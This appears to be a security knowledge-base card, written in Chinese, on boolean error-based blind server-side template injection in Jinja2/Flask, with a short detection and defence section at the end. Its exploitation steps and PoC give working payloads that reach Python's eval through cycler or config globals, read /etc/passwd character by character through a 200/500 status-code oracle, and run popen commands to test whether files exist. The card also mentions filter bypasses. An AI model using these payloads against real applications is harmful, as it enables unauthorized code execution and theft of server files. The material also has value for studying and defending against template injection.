---
id: web-python-ssti-jinja2-boolean-error-blind
title: Jinja2 布尔报错盲注：1/(条件) 以 500/200 状态码逐字符提取数据
type: scenario
domain: web
path: web/python/ssti
technique: ssti-boolean-error-blind
tags:
- ssti
- jinja2
- blind
- boolean-based
- error-based
- side-channel
- python
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V77
  verified_at: '2026-11-05T16:31:02+08:00'
  notes: 已对照原文与图04核对：1/(布尔) 的 200/500 oracle 与原文 jinja2 命令行实验一致（原图用 not 反转，卡内已给出映射说明与变体）；JS 1/0 不抛异常等边界正确；未独立复跑
url: /docs/web/python/ssti/web-python-ssti-jinja2-boolean-error-blind/
draft: false
kb_aliases:
- SSTI 布尔报错盲注
- SSTI boolean error-based blind
- 1/0 布尔盲注
- 报错布尔盲注
- 错误状态码盲注
- Error-based boolean SSTI
---

## 一句话结论

在 Jinja2 盲 SSTI 中，用 `1 / (条件)` 把布尔值转成“正常渲染 vs 除零异常”：条件为真得到 `1/1`（HTTP 200），为假得到 `1/0`（HTTP 500）；即使页面不回显结果、错误详情也被隐藏，只要状态码或错误页可区分，就能以每字符约 log2(字符集) 次请求快速盲注出数据。

## 原理

Python 中 `bool` 是 `int` 的子类，`True == 1`、`False == 0`。`1 / True` 正常得到 `1.0`；`1 / False` 触发 `ZeroDivisionError`，异常沿模板渲染栈冒泡到 Web 框架，通常变成 500，或与正常响应形成稳定差异。于是任意可表达为布尔的判断都能编码成“是否抛异常”，观测维度从响应内容（容易被统一模板掩盖）换成 HTTP 状态码或错误页是否出现。相比 `sleep` 时间盲注，它不受网络抖动影响，且每字符可用二分把请求数压到 7 次左右。

## 触发条件

- 目标为 Jinja2/Python 且存在盲 SSTI：表达式会执行，但结果不回显；
- 应用保留 200 与 500 的差异，或正常页与错误页有稳定的内容/长度差异；
- 模板表达式能进行比较、索引、长度等运算；需要 `eval` 时 `__builtins__` 未被沙箱移除；
- 若应用吞掉异常并统一返回 200 且页面完全一致，本手法失效，需改用时间盲注或其他 oracle。

## 利用步骤

1. 校准 oracle：`{{ 1/(1==1) }}` 应正常（200），`{{ 1/(1==2) }}` 应报错（500）；若映射相反，说明布尔被转换，改用 `{{ 1/(not (条件)) }}` 或调整取值方式。
2. 选择表达式入口：优先用 Jinja2 原生表达式，不依赖 `eval`，如 `{{ 1/(config['ITEMS'][0]['name'][0] == 'a') }}`；需要任意 Python 时取 `cycler.__init__.__globals__.__builtins__.eval`（Flask 中也可用 `config.__class__.__init__.__globals__['__builtins__']['eval']`）。
3. 先测长度，再逐字符二分：`len(x) > mid`、`ord(x[i]) > mid`，每字符约 7 次请求；也可用等值比较线性枚举。
4. 提取文件或命令输出：`open('/etc/passwd').read()[i]`、`popen('cat /etc/passwd').read()[i]`；文件存在性可用 `popen('cat 路径').proc.wait() == 0` 作为布尔量。
5. 自动化时只判状态码或错误标记，记录每个条件的真值并重组字符串；遇到关键字过滤时结合编码与属性访问绕过。

## PoC

```jinja2
# 校准
{{ 1 / (1 == 1) }}          # 200 / 正常页
{{ 1 / (1 == 2) }}          # 500 / 错误页

# 逐字符判断：/etc/passwd 第一位是否为 'r'
{{ 1 / (cycler.__init__.__globals__.__builtins__.eval("open('/etc/passwd').read()[0] == 'r'")) }}

# Flask 下的等价写法
{{ 1 / (config.__class__.__init__.__globals__['__builtins__']['eval']("open('/etc/passwd').read()[0]=='r'")) }}
```

`eval` 返回 `True` 时 `1/True` 正常渲染，返回 `False` 时 `1/0` 抛 `ZeroDivisionError`，据此判定条件真值。若自动化脚本约定“渲染成功 = 条件为假”，在条件外再套 `not` 反转映射。

## 变体与关联

- 变体：`1/(not 条件)` 反转真值映射，适配把“无异常”视为 False 的工具。
- 变体：文件/目录存在性 oracle：`1/(popen('cat /path').proc.wait() == 0)`。
- 跨引擎：PHP（Twig/Smarty）除零抛 `DivisionByZeroError` 等错误，Java（FreeMarker）整数除零抛 `ArithmeticException`，Ruby 抛 `ZeroDivisionError`，同样可用 200/500 作 oracle；JavaScript/Node 的 `1/0` 是 `Infinity` 不抛异常，需换 `undefined.x`、`JSON.parse('')` 等必错原语构造。
- 关联：错误消息可见时直接外带更快，见 [[web-generic-ssti-error-message-exfiltration]]；dunder/内置被过滤时见 [[web-python-ssti-jinja2-waf-bypass-hex-attr-args]]、[[web-python-ssti-jinja2-flask-globals-rce]]。

## 检测与防御

- 检测：模板参数中出现 `1/(`、`1 / (`、`__class__`、`__globals__`、`__builtins__`、`eval(`、`popen(`、`read()[`、`ord(` 等组合；同一会话高比例 500 或错误页；按字符区间递增的规律性请求。
- 防御：不把用户输入拼进模板；启用 Jinja2 沙箱并限制可访问属性与内置；统一错误页只能减少信息量，无法消除状态码 oracle；对模板表达式关键字做 WAF；限速并对异常率告警。
- 注意：应用返回统一 200 错误页时，攻击者仍可用响应长度或错误标记作 oracle，需从根上消除注入点。
